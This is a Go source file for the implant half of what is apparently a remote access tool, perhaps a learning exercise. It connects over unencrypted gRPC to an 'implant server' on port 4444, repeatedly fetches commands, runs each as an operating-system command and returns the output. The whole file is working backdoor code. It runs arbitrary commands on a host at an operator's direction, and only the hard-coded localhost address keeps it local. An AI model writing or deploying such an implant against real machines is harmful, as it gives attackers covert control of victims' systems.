package main

import (
	"cleonty/rat/grpcapi"
	"context"
	"fmt"
	"log"
	"os/exec"
	"strings"
	"time"

	"google.golang.org/grpc"
)

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.ImplantClient
	)
	opts = append(opts, grpc.WithInsecure())
	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), opts...); err != nil {
		log.Fatal(err)
	}
	fmt.Printf("implant client connected to implant server at port 4444\n")
	defer conn.Close()
	client = grpcapi.NewImplantClient(conn)
	ctx := context.Background()
	for {
		var req = new(grpcapi.Empty)
		fmt.Printf("implant client about to fetch command from implant server\n")
		cmd, err := client.FetchCommand(ctx, req)
		if err != nil {
			log.Fatal(err)
		}
		if cmd.In == "" {
			// No work
			time.Sleep(3 * time.Second)
			continue
		}
		fmt.Printf("implant client fetched non-empty command %s\n", cmd.In)
		tokens := strings.Split(cmd.In, " ")
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}
		buf, err := c.CombinedOutput()
		if err != nil {
			cmd.Out = err.Error()
		}
		cmd.Out += string(buf)
		client.SendOutput(ctx, cmd)
		fmt.Printf("implant client send output for command %s\n", cmd.In)
	}
}
